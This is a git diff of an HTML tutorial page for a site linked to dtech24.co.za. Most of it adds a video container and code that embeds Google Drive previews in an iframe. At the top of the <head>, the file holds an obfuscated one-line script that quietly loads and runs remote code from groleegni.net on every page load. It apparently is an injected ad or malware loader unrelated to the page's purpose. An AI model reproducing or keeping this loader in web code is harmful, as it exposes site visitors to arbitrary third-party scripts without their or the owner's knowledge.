@@ -1,6 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+
 <script>(function(d,z,s){s.src='https://'+d+'/401/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('groleegni.net',9555547,document.createElement('script'))</script>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -127,6 +128,20 @@
     .note-box a:hover {
       text-decoration: underline;
     }
+
+    .video-container {
+      margin: 1.5rem 0;
+      width: 100%;
+      aspect-ratio: 16/9;
+      border-radius: 8px;
+      overflow: hidden;
+    }
+
+    .video-container iframe {
+      width: 100%;
+      height: 100%;
+      border: none;
+    }
   </style>
 </head>
 <body>
@@ -147,7 +162,11 @@
       <p id="contentDescription"></p>
       <div id="tutorialSteps"></div>
 
-      <a href="#" id="watchTutorial" class="btn btn-primary" target="_blank">
+      <div class="video-container" id="videoContainer">
+        <!-- Video will be embedded here -->
+      </div>
+
+      <a href="#" id="watchTutorial" class="btn btn-primary" target="_blank" style="display: none;">
         <i class="fas fa-play"></i> Watch Video Tutorial
       </a>
       <a href="https://www.dtech24.co.za" id="downloadFiles" class="btn btn-outline" target="_blank">
@@ -183,6 +202,16 @@
     document.getElementById('contentTitle').textContent = `${title} Tutorial`;
     document.getElementById('contentDescription').textContent = description;
 
+    // Function to convert Google Drive URL to embed format
+    function getEmbedUrl(originalUrl) {
+      // Extract file ID from URL
+      const match = originalUrl.match(/\/file\/d\/([^\/]+)/);
+      if (match && match[1]) {
+        return `https://drive.google.com/file/d/${match[1]}/preview`;
+      }
+      return originalUrl;
+    }
+
     // Determine which Google Drive URL to use based on the passed down info
     function getVideoUrl() {
       const lowerTitle = title.toLowerCase();
@@ -197,7 +226,7 @@
         return 'https://drive.google.com/file/d/1-RkZaXQvzSLWFKCl8fAuN9pnhWLz8knn/view?usp=drivesdk';
       }
       // Default URL if none of the above
-      return '#';
+      return null;
     }
 
     // Tutorial data
@@ -268,8 +297,16 @@
       // Set tutorial steps
       document.getElementById('tutorialSteps').innerHTML = tutorial.steps;
 
-      // Set the watch tutorial button URL
-      document.getElementById('watchTutorial').href = getVideoUrl();
+      // Get and embed the video
+      const videoUrl = getVideoUrl();
+      if (videoUrl) {
+        const embedUrl = getEmbedUrl(videoUrl);
+        const videoContainer = document.getElementById('videoContainer');
+        videoContainer.innerHTML = `<iframe src="${embedUrl}" allow="autoplay"></iframe>`;
+      } else {
+        // If no video URL found, show the watch button as fallback
+        document.getElementById('watchTutorial').style.display = 'inline-flex';
+      }
     }
 
     // Always set download link to dtech24.co.za
